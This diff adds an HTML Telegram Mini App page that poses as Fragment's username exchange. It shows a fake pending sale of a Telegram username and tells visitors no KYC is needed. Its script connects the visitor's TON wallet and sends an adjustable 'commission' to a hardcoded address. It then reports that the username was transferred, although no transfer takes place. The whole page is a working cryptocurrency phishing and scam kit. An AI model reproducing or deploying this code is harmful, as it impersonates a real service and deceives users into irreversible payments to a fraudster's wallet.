@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fragment Username Exchange</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <style>
+        :root { --primary: #0088cc; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            padding: 15px; 
+            max-width: 100%;
+            overflow-x: hidden;
+            background: #f8f9fa;
+            color: #212529;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h3 { color: var(--primary); margin-bottom: 5px; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; background: white; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e0e0e0; }
+        th { background-color: #f5f7fa; }
+        button { 
+            background: var(--primary); 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 12px; 
+            width: 100%; 
+            font-size: 17px; 
+            margin: 20px 0; 
+            cursor: pointer;
+            font-weight: 600;
+            box-shadow: 0 4px 6px rgba(0,136,204,0.2);
+        }
+        .status-badge { 
+            background: #e6f7ff; 
+            color: var(--primary); 
+            padding: 6px 12px; 
+            border-radius: 20px; 
+            font-size: 14px; 
+            display: inline-block;
+            font-weight: 500;
+            margin: 10px 0;
+        }
+        .address { 
+            word-break: break-all; 
+            font-size: 14px; 
+            font-family: monospace;
+            color: #495057;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 15px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background: #e9ecef;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h3>FRAGMENT</h3>
+            <h4>Search usernames</h4>
+            <hr>
+            
+            <div class="status-badge">Deal In Progress</div>
+            <h2 id="usernameDisplay">biruk.t.me</h2>
+            
+            <table>
+                <tr>
+                    <th>Deal Price</th>
+                    <th>Commission</th>
+                </tr>
+                <tr>
+                    <td><strong id="priceDisplay">100</strong> TON</td>
+                    <td><strong id="commissionDisplay">5</strong> TON</td>
+                </tr>
+            </table>
+            
+            <p><small>How does this work?</small></p>
+        </div>
+        
+        <div class="card">
+            <p><strong>Telegram Username</strong><br><span id="usernameText">@biruk</span></p>
+            <p><strong>Web Address</strong><br>t.me/<span id="usernameLink">biruk</span></p>
+            <p><strong>TON Web 3.0 Address</strong><br><span class="address">UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM</span></p>
+        </div>
+        
+        <button id="startExchange">Start Exchange</button>
+        <div class="loader" id="loader"></div>
+        <p style="text-align: center;"><small>Subscribe to updates</small></p>
+        
+        <div class="card">
+            <p><small>You do not need to complete KYC verification, as the buyer is a verified merchant on Fragment.</small></p>
+        </div>
+        
+        <div class="card">
+            <table>
+                <tr>
+                    <th>Deal Status</th>
+                    <th>TON - Username</th>
+                    <th>Recipient</th>
+                </tr>
+                <tr>
+                    <td><strong>Ready</strong></td>
+                    <td>Swappable</td>
+                    <td class="address">UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const Telegram = window.Telegram.WebApp;
+        const tonConnect = new TonConnectSDK.TonConnect();
+        
+        // Показываем загрузчик
+        function showLoader(show) {
+            document.getElementById('loader').style.display = show ? 'block' : 'none';
+            document.getElementById('startExchange').disabled = show;
+        }
+        
+        // Инициализация приложения
+        Telegram.ready();
+        Telegram.expand();
+        Telegram.BackButton.hide();
+        
+        // Парсинг параметров
+        function parseStartParams() {
+            const params = new URLSearchParams(window.location.search).get('tgWebAppStartParam');
+            if (!params) {
+                return {
+                    username: 'biruk',
+                    price: '100',
+                    commission: '5'
+                };
+            }
+            
+            const parts = params.split('-');
+            return {
+                username: parts[0] || 'biruk',
+                price: parts[1] || '100',
+                commission: parts[2] || '5'
+            };
+        }
+        
+        // Обновляем данные в интерфейсе
+        function updateUI() {
+            const { username, price, commission } = parseStartParams();
+            
+            document.getElementById('usernameDisplay').textContent = `${username}.t.me`;
+            document.getElementById('usernameText').textContent = `@${username}`;
+            document.getElementById('usernameLink').textContent = username;
+            document.getElementById('priceDisplay').textContent = price;
+            document.getElementById('commissionDisplay').textContent = commission;
+        }
+        
+        // Инициализация
+        updateUI();
+        
+        // Обработка платежа
+        document.getElementById('startExchange').addEventListener('click', async () => {
+            showLoader(true);
+            
+            try {
+                // Проверяем поддержку TON Connect
+                if (typeof TonConnectSDK === 'undefined') {
+                    Telegram.showAlert("TON Connect is not available. Please update Telegram.");
+                    return;
+                }
+                
+                // Подключение кошелька
+                if (!tonConnect.wallet) {
+                    try {
+                        await tonConnect.connectWallet();
+                    } catch (e) {
+                        Telegram.showAlert("Wallet connection failed: " + e.message);
+                        showLoader(false);
+                        return;
+                    }
+                }
+                
+                // Создание транзакции
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [
+                        {
+                            address: "UQDXBD5iScateB1lm4SxkRUn6zqCMgdFooAd-6PxWjkT9uPM",
+                            amount: `${parseInt(parseStartParams().commission) * 1000000000}`
+                        }
+                    ]
+                };
+                
+                // Отправка транзакции
+                try {
+                    const result = await tonConnect.wallet.sendTransaction(transaction);
+                    
+                    if (result && result.boc) {
+                        Telegram.showAlert("✅ Payment successful! Username transferred.");
+                        Telegram.sendData(JSON.stringify({
+                            username: parseStartParams().username,
+                            commission: parseStartParams().commission,
+                            tx_hash: result.boc
+                        }));
+                        Telegram.close();
+                    } else {
+                        Telegram.showAlert("⚠️ Payment failed. Please try again.");
+                    }
+                } catch (error) {
+                    Telegram.showAlert(`❌ Transaction error: ${error.message}`);
+                }
+                
+            } catch (error) {
+                Telegram.showAlert(`❌ Error: ${error.message}`);
+            } finally {
+                showLoader(false);
+            }
+        });
+    </script>
+</body>
+</html>
